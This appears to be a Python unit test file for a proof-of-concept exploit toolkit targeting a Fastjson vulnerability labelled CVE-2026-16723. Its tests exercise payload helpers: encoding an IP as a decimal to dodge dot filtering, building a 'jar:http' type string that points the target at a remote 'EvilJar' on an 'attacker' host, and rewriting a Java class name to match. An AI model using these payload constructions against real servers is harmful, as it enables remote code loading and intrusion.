"""CVE-2026-16723 单元测试（不打真实目标）。"""

from __future__ import annotations

from fastjson_toolkit.poc.cve_2026_16723.class_name_modifier import (
    get_this_class_name,
    rewrite_class_name,
)
from fastjson_toolkit.poc.cve_2026_16723.runner import (
    ipv4_to_decimal,
    make_jarhttp_type,
    normalize_type_arg,
    resolve_payload_http_host,
)
from fastjson_toolkit.poc.cve_2026_16723.service import _options_to_argv
from fastjson_toolkit.poc import Poc16723Options


def test_ipv4_to_decimal():
    assert ipv4_to_decimal("127.0.0.1") == "2130706433"
    assert ipv4_to_decimal("192.168.0.1") == "3232235521"


def test_resolve_payload_http_host_auto_decimal():
    host, note = resolve_payload_http_host("127.0.0.1", "auto")
    assert host == "2130706433"
    assert "decimal" in note


def test_resolve_payload_http_host_plain():
    host, note = resolve_payload_http_host("attacker", "auto")
    assert host == "attacker"
    assert note == "plain"


def test_resolve_payload_http_host_rejects_dotted_name():
    try:
        resolve_payload_http_host("host.docker.internal", "none")
        assert False, "expected ValueError"
    except ValueError as e:
        assert "含 '.'" in str(e)


def test_make_jarhttp_type():
    t = make_jarhttp_type("attacker", 9192, "EvilJar", "Pwn")
    assert t == "jar:http:..attacker:9192.EvilJar!.Pwn"
    restored = t.replace(".", "/")
    assert restored == "jar:http://attacker:9192/EvilJar!/Pwn"


def test_normalize_type_arg_strips_quotes():
    assert normalize_type_arg("'jar:file:.proc.self.fd.1!.C1'") == "jar:file:.proc.self.fd.1!.C1"
    assert normalize_type_arg('"jar:http:..attacker:9192.A!.B"') == "jar:http:..attacker:9192.A!.B"


def test_rewrite_class_name_roundtrip():
    # minimal synthetic class with Utf8 this_class "Foo"
    # Use a tiny handcrafted class file is brittle; instead compile-free:
    # craft constant pool: magic, versions, cp with Utf8 Foo + Class, this_class=1
    import struct

    # CAFEBABE, minor=0, major=52, cp_count=3
    # #1 Utf8 "Foo", #2 Class -> #1
    utf8 = b"Foo"
    cp = bytearray()
    cp += struct.pack(">H", 3)  # constant_pool_count
    cp.append(1)  # Utf8
    cp += struct.pack(">H", len(utf8))
    cp += utf8
    cp.append(7)  # Class
    cp += struct.pack(">H", 1)
    body = bytearray()
    body += struct.pack(">IHH", 0xCAFEBABE, 0, 52)
    body += cp
    body += struct.pack(">HHH", 0x0021, 2, 0)  # access, this_class=#2, super=0
    body += struct.pack(">HHH", 0, 0, 0)  # interfaces/fields/methods count
    body += struct.pack(">H", 0)  # attributes
    data = bytes(body)
    assert get_this_class_name(data) == "Foo"
    new_name = "jar:http:..attacker:9192.EvilJar!.Pwn".replace(".", "/")
    out = rewrite_class_name(data, new_name)
    assert get_this_class_name(out) == new_name


def test_options_to_argv_echo():
    opts = Poc16723Options(target="http://127.0.0.1:18083", echo=True, mode="http")
    argv = _options_to_argv(opts)
    assert "-u" in argv
    assert "http://127.0.0.1:18083" in argv
    assert "-e" in argv
    assert "-m" in argv and "http" in argv
